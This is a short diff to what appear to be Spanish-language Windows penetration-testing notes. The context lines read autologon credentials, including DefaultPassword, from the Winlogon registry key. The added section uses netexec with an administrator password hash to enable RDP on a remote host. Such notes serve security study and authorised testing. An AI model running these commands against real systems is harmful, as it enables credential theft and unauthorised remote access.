@@ -165,3 +165,7 @@ cd "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 Get-ItemProperty . | select-Object DefaultDomainName, DefaultUserName, DefaultPassword
 ```
 
+### Habilitar el RDP
+
+
+netexec smb IP -u administrator -H hash -m rdp -o ACTION=enable
